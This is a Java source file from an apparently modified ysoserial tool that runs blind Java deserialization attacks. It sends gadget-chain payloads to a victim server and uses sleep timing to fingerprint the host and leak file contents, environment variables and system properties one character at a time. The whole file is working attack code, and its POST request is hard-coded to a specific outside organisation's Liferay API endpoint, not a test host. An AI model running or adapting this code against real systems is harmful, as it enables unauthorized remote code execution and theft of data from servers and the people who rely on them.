package ysoserial.blind;

import org.json.JSONObject;
import ysoserial.Log;

import java.net.Proxy;
import java.net.URLEncoder;
import java.util.*;
import java.util.stream.Collectors;
import static ysoserial.blind.Utils.merge;

/**
 * Weaponizing blind commons gadgets.
 *
 * Created by dusanklinec on 14.09.16.
 */
public class Attack {
    /**
     * Object used to build binary payloads from the JSON specification.
     */
    final private Generator generator = new Generator();

    /**
     * Default sleep time used in the exploit gadgets
     * to trigger the condition.
     */
    public static final long DEFAULT_SLEEP_TIME = 30000;

    /**
     * Number of attempts to perform with one check condition to mitigate network errors.
     * e.g., if 3, the same condition is checked 3 times before evaluating and moving to the next one.
     * The majority is taken as a result. If it is a tie, more need to be done.
     */
    public static final int MIN_ATTEMPTS = 1;

    /**
     * Use post to push the payload
     */
    public static final String ATTACK_METHOD = "POST";

    public static final String URL_TO_READ = "your-url";
    /**
     * Proxy to be used in the requests.
     */
    private Proxy proxy = Proxy.NO_PROXY;

    /**
     * Run basic tests against the host: java versions, OS detections,
     */
    public void dumpReport() throws Exception {
        final JSONObject sleepJson = AttackTools.payloadSleep(DEFAULT_SLEEP_TIME);

        // Test our proxy server
        final String publicIp = AttackUtils.httpGet(URL_TO_READ, proxy);
        log("Public IP address: %s", publicIp);

        // Basic sleep - does it work?
        Log.addLog("sleep01Worked: 1");
        final boolean sleep01Worked = applyPayloadOnVictim(sleepJson);
        log("Sleep Commons01 worked: %s", sleep01Worked);
        Log.addLog("Sleep Commons01 worked: " + sleep01Worked);

        Log.addLog("sleep01Worked: - module 5");
        final boolean sleep05Worked = applyPayloadOnVictim(sleepJson, true, 5, null);

        log("Sleep Commons05 worked: %s", sleep05Worked);
        Log.addLog("Sleep Commons05 worked: " + sleep05Worked);

        Log.addLog("sleep01Worked: - module 6");
        final boolean sleep06Worked = applyPayloadOnVictim(sleepJson, true, 6, null);

        log("Sleep Commons06 worked: %s", sleep06Worked);
        Log.addLog("Sleep Commons06 worked: " + sleep06Worked);
        log(" ");

        // Javassist based exploits.
        // CC2, CC4 are Commons Collection 4.x exploits.
        final String sleepCode = String.format("java.lang.Thread.sleep(%sl);", DEFAULT_SLEEP_TIME);
        final Collection<String> javassistExps = Arrays.asList("cb1", "cc2", "cc3", "cc4",
        "hibernate", "weld", "jboss", "jdk7", "json",
        "rhino", "rome", "spring1", "spring2");


        for(String expClass : javassistExps){
            Log.addLog("expClass: " + expClass);
            JSONObject spec = Utils.parseJSON(String.format("{javassist:\"%s\", code:\"%s\"}", expClass, sleepCode));
            final boolean specWorked = applyRawPayloadOnVictim(spec);

            log("Javassist[%10s] worked: %s", expClass, specWorked);
        }
        log(" ");

        // Test maximum length of the payload accepted by the service
        final boolean len1k = applyPayloadOnVictim(
                merge(AttackTools.payloadCmd("lengthTest", 1024), sleepJson));
        log("Length limit 1k passed: %s", len1k);
        final boolean len4k = applyPayloadOnVictim(
                merge(AttackTools.payloadCmd("lengthTest", 4096), sleepJson));
        log("Length limit 4k passed: %s", len4k);
        final boolean len16k = applyPayloadOnVictim(
                merge(AttackTools.payloadCmd("lengthTest", 16384), sleepJson));
        log("Length limit 16k passed: %s", len16k);
        final boolean len256k = applyPayloadOnVictim(
                merge(AttackTools.payloadCmd("lengthTest", 262144), sleepJson));
        log("Length limit 256k passed: %s", len256k);
        final boolean len1M = applyPayloadOnVictim(
                merge(AttackTools.payloadCmd("lengthTest", 1048576), sleepJson));
        log("Length limit 1M passed: %s", len1M);
        log(" ");

        // Java version counter, all java versions, to be sure
        for(int i = 4; i <= 8; i++){
            final JSONObject javaJson = AttackTools.payloadCmd("java", i);
            final boolean javaBool = applyPayloadOnVictim(Arrays.asList(javaJson, sleepJson));
            log("Java %d version: %s", i, javaBool);
        }
        log(" ");

        // Security manager in place?
        final boolean secMgrWasNull = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                merge(AttackTools.payloadCmd("secMgr"), AttackTools.payloadCmd("pnull", null))
        ));
        log("Security manager == null? %s", secMgrWasNull);
        log(" ");

        // OS detection
        JSONObject osNameProp = AttackTools.payloadCmd("property", "os.name");
        JSONObject toLowerCase = AttackTools.payloadCmd("toLower");
        final boolean isWin = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                merge(osNameProp, toLowerCase, AttackTools.payloadCmd("startsWith", "windows"))));
        final boolean isMac = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                merge(osNameProp, toLowerCase, AttackTools.payloadCmd("contains", "mac"))));
        final boolean isDarwin = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                merge(osNameProp, toLowerCase, AttackTools.payloadCmd("contains", "darwin"))));
        final boolean isNux = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                merge(osNameProp, toLowerCase, AttackTools.payloadCmd("contains", "nux"))));
        final boolean isSun = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                merge(osNameProp, toLowerCase, AttackTools.payloadCmd("contains", "sunos"))));
        final boolean isBsd = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                merge(osNameProp, toLowerCase, AttackTools.payloadCmd("contains", "bsd"))));
        log("OS: win: %s", isWin);
        log("OS: mac: %s", isMac);
        log("OS: darwin: %s", isDarwin);
        log("OS: nux: %s", isNux);
        log("OS: sun: %s", isSun);
        log("OS: bsd: %s", isBsd);
        log(" ");

        // Ping path
        final boolean isPing01 = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                AttackTools.payloadCmd("fileEx", "/bin/ping")));
        final boolean isPing02 = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                AttackTools.payloadCmd("fileEx", "/sbin/ping")));
        final boolean isPing03 = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                AttackTools.payloadCmd("fileEx", "/usr/bin/ping")));
        final boolean isPing04 = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                AttackTools.payloadCmd("fileEx", "/usr/sbin/ping")));
        final boolean isPing05 = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                AttackTools.payloadCmd("fileEx", "/usr/local/bin/ping")));
        final boolean isBash = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                AttackTools.payloadCmd("fileEx", "/bin/bash")));
        final boolean isSh = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                AttackTools.payloadCmd("fileEx", "/bin/sh")));

        // Property read - interesting ones
        log("OS: /bin/ping %s", isPing01);
        log("OS: /sbin/ping %s", isPing02);
        log("OS: /usr/bin/ping %s", isPing03);
        log("OS: /usr/sbin/ping %s", isPing04);
        log("OS: /usr/local/bin/ping %s", isPing05);
        log("OS: /bin/bash %s", isBash);
        log("OS: /bin/sh %s", isSh);
        log(" ");

        final boolean isBase6401 = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                AttackTools.payloadCmd("fileEx", "/bin/base64")));
        final boolean isBase6402 = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                AttackTools.payloadCmd("fileEx", "/sbin/base64")));
        final boolean isBase6403 = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                AttackTools.payloadCmd("fileEx", "/usr/bin/base64")));
        final boolean isBase6404 = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                AttackTools.payloadCmd("fileEx", "/usr/sbin/base64")));
        log("OS: /bin/base64 %s", isBase6401);
        log("OS: /sbin/base64 %s", isBase6402);
        log("OS: /usr/bin/base64 %s", isBase6403);
        log("OS: /usr/sbin/base64 %s", isBase6404);
        log(" ");

        // Can connect?
        JSONObject connJson = AttackTools.payloadCmd("secConnect");
        connJson.put("host", "google.com");
        connJson.put("port", "80");
        final boolean canConnect = applyPayloadOnVictim(merge(connJson, sleepJson));
        log("Can connect to google.com:80: %s", canConnect);

        // Can exec /bin/bash?
        final boolean canExec  = applyPayloadOnVictim(
                merge(AttackTools.payloadCmd("secExec", "/bin/bash"), sleepJson));
        log("Can exec /bin/bash: %s", canExec);

        // Can read /etc/passwd?
        final boolean canRead  = applyPayloadOnVictim(
                merge(AttackTools.payloadCmd("secRead", "/bin/passwd"), sleepJson));
        log("Can read /etc/passwd: %s", canRead);

        // Can write to /tmp?
        final boolean writeTmp = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                AttackTools.payloadCmd("fileCanWrite", "/tmp")));
        log("Can write to /tmp : %s", writeTmp);

        // Can write to /var/tmp?
        final boolean writeVarTmp = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                AttackTools.payloadCmd("fileCanWrite", "/var/tmp")));
        log("Can write to /var/tmp : %s", writeVarTmp);

        // Can execute /bin/bash?
        final boolean canExecBash = applyPayloadOnVictim(merge(
                AttackTools.payloadCmd("bashc", "echo ok"),
                sleepJson
        ));
        log("Can execute /bin/bash -c echo ok : %s", canExecBash);
        log(" ");

        //Operating system name
        dumpProperty("os.name");
        dumpProperty("os.version");
        dumpProperty("user.dir");
        dumpProperty("user.home");
        dumpProperty("user.name");
        dumpProperty("os.arch");
        dumpProperty("java.version");
        dumpProperty("java.vendor");
        dumpProperty("java.home");
        dumpProperty("catalina.config");
        dumpEnvVar("CATALINA_OPTS");
        dumpEnvVar("PATH");
        dumpEnvVar("OSTYPE");
    }

    /**
     * Dumps the file contents.
     * @param fileName
     */
    public void dumpFile(String fileName) throws Exception {
        final JSONObject sleepJson = AttackTools.payloadSleep(DEFAULT_SLEEP_TIME);

        // Test if file exists
        // Security manager, throws an exception if problem, sleep if not.
        final JSONObject secRead = AttackTools.payloadCmd("secRead", fileName);
        List<JSONObject> payload = Arrays.asList(secRead, sleepJson);
        boolean fileSecReadable = applyPayloadOnVictim(payload);
        log("File security manager readable: %s", fileSecReadable);

        // File readable.
        // Constructs predicate, for this we need to construct a condition and sleep if we can read.
        // In many error cases exception is throws -> no sleep.
        final JSONObject eadIf = AttackTools.sleepOnPredicate(AttackTools.payloadCmd("fileCanRead", fileName));
        boolean fileReadable = applyPayloadOnVictim(Collections.singletonList(eadIf));
        log("File readable: %s", fileReadable);
        if (!fileReadable){
            return;
        }

        // File scanner - read.
        log("Going to extract file contents: %s", fileName);
        final JSONObject fileReadSpec = AttackTools.payloadCmd("fileRead", fileName);
        dumpString(Collections.singletonList(fileReadSpec));
    }

    /**
     * Dumps environment variable
     * @param propertyName
     */
    public void dumpEnvVar(String propertyName) throws Exception {
        final JSONObject prop = AttackTools.payloadCmd("env", propertyName);

        log("Going to extract env var: %s", propertyName);
        dumpString(Collections.singletonList(prop));
    }

    /**
     * Dumps property value.
     * @param propertyName
     */
    public void dumpProperty(String propertyName) throws Exception {
        final JSONObject prop = AttackTools.payloadCmd("property", propertyName);

        log("Going to extract property: %s", propertyName);
        dumpString(Collections.singletonList(prop));


    }

    /**
     * Dumps property value.
     * @param stringFetchJson JSON sequence for extracting the string - generator command
     */
    public void dumpString(List<JSONObject> stringFetchJson) throws Exception {
        // Build regex alphabet - ascii ordering.
        ArrayList<String> alphabet = AttackUtils.generateAsciiRegexAlphabet();
        ArrayList<String> alphabetRepr = AttackUtils.generateAsciiRegexAlphabet(false);
        log("Prepared alphabet: %s", alphabet.stream().collect(Collectors.joining("")));
        log("Num steps in binary search %s", Math.log(alphabet.size())/Math.log(2));

        // Get length.
        log("Going to find length of the string");

        // a.0) is null -> sleep
        final JSONObject ifNull = AttackTools.sleepOnPredicate(
                merge(stringFetchJson, AttackTools.payloadCmd("pnull", null)));
        final boolean wasNull = applyPayloadOnVictim(ifNull);
        log("String is null: %s", wasNull);
        if (wasNull) return;

        // a.1) is empty -> sleep
        final JSONObject ifEmpty = AttackTools.sleepOnPredicate(
                merge(stringFetchJson, AttackTools.payloadCmd("isEmpty", null)));
        final boolean wasEmpty = applyPayloadOnVictim(ifEmpty);
        log("String is empty: %s", wasEmpty);
        if (wasEmpty) return;

        // b) find maximum value, start = 1.
        int curMax = 1;
        boolean maxDetected = false;
        for(; !maxDetected; curMax *= 2) {
            log("--Max length guess: %s", curMax);
            final boolean yes = applyPayloadOnVictim(AttackTools.getBisectLen(stringFetchJson, 0, curMax));
            if (!yes){
                maxDetected = true;
            }
        }

        log("Length is between %s and %s", curMax/4-1, curMax/2);

        // c) bisection on length interval
        int a = curMax/4-1;
        int b = curMax/2;
        while(a < b){
            int mid = (int)Math.ceil((a+b)/2.0);

            log("--Length: %s - %s, mid: %s", a, b, mid);
            final boolean yes = applyPayloadOnVictim(AttackTools.getBisectLen(stringFetchJson, a, mid));
            if (yes){
                a = mid;
            } else {
                b = mid-1;
            }
        }

        // d) character extraction
        StringBuilder sb = new StringBuilder();
        for(int i = 0, maxlen = a; i < maxlen; i++){
            // Bisection on the character, is from the total range? if not - placeholder it and move on.
            String range = "["+alphabet.stream().collect(Collectors.joining(""))+"]";
            log("--[%s]Range to test: %s", i, range);

            final boolean yes = applyPayloadOnVictim(AttackTools.getBisectSpec(stringFetchJson, i, range, true));
            if (yes){
                log("--[%s]Character is outside the alphabet", i);
                sb.append("■");
                continue;
            }

            a = 0;
            b = alphabet.size();
            ArrayList<String> subAlph = new ArrayList<>(alphabet.size());
            ArrayList<String> subAlph2 = new ArrayList<>(alphabet.size());
            boolean yes2 = false;
            while(a+1 < b){
                int mid = (int)Math.ceil((a+b)/2.0);
                subAlph.clear();
                subAlph2.clear();
                for(int j = a; j < b; j++){
                    if (j < mid) subAlph.add(alphabet.get(j));
                    if (j>=mid) subAlph2.add(alphabet.get(j));
                }

                range = "["+subAlph.stream().collect(Collectors.joining(""))+"]";
                final String range2 = "["+subAlph2.stream().collect(Collectors.joining(""))+"]";

                // Optimization can be done here - take range and range2,
                // sleep on the less probable one to save some time. Can be done on the fly.
                // With frequency analysis or autocomplete engines.
                yes2 = applyPayloadOnVictim(AttackTools.getBisectSpec(stringFetchJson, i, range));

                log("--[%04d]Length: %03d - %03d, mid: %03d. y: %s, range: %s                         vs %s",
                        i, a, b, mid, yes2 ? 1:0, range, range2);
                if (!yes2){
                    a = mid;
                } else {
                    b = mid;
                }
            }
            String resChar = alphabetRepr.get(yes2 ? a : b-1);
            sb.append(resChar);

            log("--[%s]=✂%s✂", i, resChar);
        }

        log("Extracted string: %s", sb.toString());
    }

    protected JSONObject payloadWithExec(Collection<JSONObject> objs){
        return AttackTools.payloadWithExec(objs);
    }

    protected JSONObject processRawPayloadSpec(JSONObject spec){
        return spec;
    }

    protected boolean applyPayloadOnVictim(Collection<JSONObject> objs) throws Exception {
        return applyPayloadOnVictim(objs, true, null, null);
    }

    protected boolean applyPayloadOnVictim(Collection<JSONObject> objs, boolean randomize, Integer module, JSONObject aux) throws Exception {
        final JSONObject pSpec2 = processRawPayloadSpec(payloadWithExec(objs));
        final List<RunResult> results2 = runPayloadAttempt(pSpec2);
        return wasVictimExcited(results2);
    }

    protected boolean applyPayloadOnVictim(JSONObject obj) throws Exception {
        return applyPayloadOnVictim(obj, true, null, null);
    }

    protected boolean applyPayloadOnVictim(JSONObject obj, boolean randomize, Integer module, JSONObject aux) throws Exception {
        return applyPayloadOnVictim(Collections.singletonList(obj));
    }

    protected boolean applyRawPayloadOnVictim(JSONObject spec) throws Exception {
//        Log.addLog("spec: " + spec);
        final List<RunResult> results2 = runPayloadAttempt(processRawPayloadSpec(spec));
        return wasVictimExcited(results2);
    }

    /**
     * true if we think the victim was activated/excited/sleep was triggered.
     * One has to take network effect into consideration or unrelated delays in the
     * target application.
     *
     * @param result result
     * @return true if yes.
     */
    public boolean wasVictimExcited(RunResult result){
        // Take the initial page load latency into account here - benchmark first without exploits.
        return (result.elapsedMilli >= DEFAULT_SLEEP_TIME);
    }

    /**
     * Evaluates the results, majority is taken. if tie, exception is thrown.
     * @param results
     * @return
     */
    public boolean wasVictimExcited(Collection<RunResult> results){
        final int size = results.size();
        int excitedCnt = 0;
        for (RunResult res : results){
            if (wasVictimExcited(res)){
                excitedCnt += 1;
            }
        }

        if (((size & 1) == 0) && excitedCnt*2 == size){
            throw new RuntimeException("More attempts needed");
        }

        return excitedCnt*2 > size;
    }

    /**
     * Runs the payload MIN_ATTEMPTS times.
     * @param payload
     * @return
     * @throws Exception
     */
    public List<RunResult> runPayloadAttempt(JSONObject payload) throws Exception {
        List<RunResult> results = new ArrayList<RunResult>(MIN_ATTEMPTS);
        for(int i = 0; i < MIN_ATTEMPTS; i ++){
            results.add(runPayload(payload));
        }

        return results;
    }

    static int count = 0;
    public RunResult runPayload(JSONObject payload) throws Exception {
        final byte[] payloadByte = generator.mainParse(payload);
        final RunResult rRes = new RunResult();
        long timeStart = 0;
        String result = null;

        final String payloadStr = Utils.base64UrlFriendly(payloadByte);
        final String payloadUrlFriendly = URLEncoder.encode(payloadStr, "UTF-8");

//        Log.addLog("payloadStr: " + payloadStr);
        count ++;
        Log.addLog("Count: "+ count + " - payloadUrlFriendly: " + payloadUrlFriendly);
        // Transition from having the prepared payload to
        // executing the payload on the victim host needs to be
        // adapted to your application.
        if (ATTACK_METHOD.equalsIgnoreCase("get")) {
            // Execute the payload, measure the time spent in the call for
            // the blind decision.
            final String url = "http://localhost:8222/suffer/" + payloadUrlFriendly;
            timeStart = System.currentTimeMillis();
            try {
                result = AttackUtils.httpGet(url, proxy);
            } catch (Exception e) {
                result = null;
                log("Exception in get Req");
            }

        } else {
            // Execute the payload, measure the time spent in the call for
            // the blind decision.
            timeStart = System.currentTimeMillis();
            try {
//                result = AttackUtils.httpPost("http://localhost:8222/suffer/", payloadUrlFriendly, proxy);
                result = AttackUtils.httpPostWithBinary("https://zonaprivada.profuturo.com.pe/api/liferay",payloadByte);
            } catch (Exception e) {
                result = null;
                log("Exception in post Req");
            }
        }

//        long totalTime = System.currentTimeMillis() - timeStart;
//
//        Log.println("total time: " + totalTime );
//
//        if (totalTime < DEFAULT_SLEEP_TIME) {
//            Log.println("Failed");
//        } else {
//            Log.println("Passed");
//        }

        // Build the result.
        rRes.elapsedMilli = System.currentTimeMillis() - timeStart;
        rRes.result = result;

        // Adapt to your application if the result was OK.
        rRes.resultOk = result != null && result.contains("success");
        return rRes;
    }

    public void log(String fmt, Object ... args){
        System.out.println(String.format(fmt, args));
    }

    public Proxy getProxy() {
        return proxy;
    }

    public void setProxy(Proxy proxy) {
        this.proxy = proxy;
    }

    public static class RunResult {
        public long elapsedMilli = 0;
        public String result;
        public boolean resultOk;
    }
}
